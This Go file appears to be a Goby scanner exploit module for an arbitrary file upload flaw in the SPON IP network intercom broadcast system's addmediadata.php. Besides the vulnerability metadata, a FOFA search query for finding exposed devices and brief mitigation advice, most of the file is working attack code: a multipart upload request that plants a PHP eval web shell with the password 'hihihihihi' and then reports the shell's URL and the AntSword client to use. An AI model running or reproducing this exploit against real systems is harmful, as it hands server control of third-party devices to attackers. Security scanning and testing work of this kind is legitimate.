package exploits

import (
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "SPON IP network intercom broadcast system addmediadata.php Arbitrary file upload",
    "Description": "<p>With the application of the advanced IP Audio ™ technology, SPON IP network intercom system, a hands-free intercom system to transmit the pure digital data, send the audio signal data package via LAN and WAN, solve the traditional limitation on the transmission distance and the problem of being vulnerable to interference.</p><p>There is a file upload vulnerability in the addmediadata.php file of Shibang IP network broadcasting system. Attackers can upload files with dangerous types without restrictions, write to the back door, obtain server permissions, and then control the whole web server.</p>",
    "Product": "IP network intercom broadcast system",
    "Homepage": "https://www.spon.com.cn/",
    "DisclosureDate": "2021-11-23",
    "Author": "",
    "FofaQuery": "body=\"lan/manifest.json\"",
    "GobyQuery": "body=\"lan/manifest.json\"",
    "Level": "3",
    "Impact": "<p>There is a file upload vulnerability in the addmediadata.php file of Shibang IP network broadcasting system. Attackers can upload files with dangerous types without restrictions, write to the back door, obtain server permissions, and then control the whole web server.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.spon.com.cn/\">https://www.spon.com.cn/</a></p><p/><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "EN": {
            "Name": "SPON IP network intercom broadcast system addmediadata.php Arbitrary file upload",
            "Product": "IP network intercom broadcast system",
            "Description": "<p>With the application of the advanced IP Audio ™ technology, SPON IP network intercom system, a hands-free intercom system to transmit the pure digital data, send the audio signal data package via LAN and WAN, solve the traditional limitation on the transmission distance and the problem of being vulnerable to interference.</p><p>There is a file upload vulnerability in the addmediadata.php file of Shibang IP network broadcasting system. Attackers can upload files with dangerous types without restrictions, write to the back door, obtain server permissions, and then control the whole web server.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.spon.com.cn/\" target=\"_blank\">https://www.spon.com.cn/</a></p><p><br></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is a file upload vulnerability in the addmediadata.php file of Shibang IP network broadcasting system. Attackers can upload files with dangerous types without restrictions, write to the back door, obtain server permissions, and then control the whole web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "References": [
        "https://www.spon.com.cn/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "expcmd",
            "type": "input",
            "value": "@eval($_POST['hihihihihi'])",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.1",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9923"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/php/addmediadata.php")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ")
			randStr := goutils.RandomHexString(8)
			name := randStr + ".php"
			flag := randStr

			cfg.Data = "------WebKitFormBoundary4LuoBRpTiVBo9cIQ\nContent-Disposition: form-data; name=\"file\"; filename=\"" + name + "\"\nContent-Type: text/plain\n\n<?php echo(\"" + flag + "\");unlink(__FILE__);?>\n\n------WebKitFormBoundary4LuoBRpTiVBo9cIQ\nContent-Disposition: form-data; name=\"subpath\"\n\n\n------WebKitFormBoundary4LuoBRpTiVBo9cIQ\nContent-Disposition: form-data; name=\"fullpath\"\n\n../php\n------WebKitFormBoundary4LuoBRpTiVBo9cIQ--"
			httpclient.DoHttpRequest(u, cfg)

			cfg2 := httpclient.NewGetRequestConfig("/php/" + name)
			cfg2.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randStr) {
					fmt.Println(randStr)
					return true
				}

			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			expcmd := "<?php " + ss.Params["expcmd"].(string) + ";?>"
			uri := "/php/addmediadata.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary4LuoBRpTiVBo9cIQ")
			randStr := goutils.RandomHexString(8)
			name := randStr + ".php"

			cfg.Data = "------WebKitFormBoundary4LuoBRpTiVBo9cIQ\nContent-Disposition: form-data; name=\"file\"; filename=\"" + name + "\"\nContent-Type: text/plain\n\n" + expcmd + "\n\n------WebKitFormBoundary4LuoBRpTiVBo9cIQ\nContent-Disposition: form-data; name=\"subpath\"\n\n\n------WebKitFormBoundary4LuoBRpTiVBo9cIQ\nContent-Disposition: form-data; name=\"fullpath\"\n\n../php\n------WebKitFormBoundary4LuoBRpTiVBo9cIQ--"

			httpclient.DoHttpRequest(expResult.HostInfo, cfg)

			uri2 := "/php/" + name
			cfg2 := httpclient.NewGetRequestConfig(uri2)
			cfg2.VerifyTls = false
			cfg2.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = "WebShell:" + expResult.HostInfo.FixedHostInfo + uri2 + "\n"
					expResult.Output += "Password: hihihihihi\nWebshell tool: AntSword v2.1.14"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}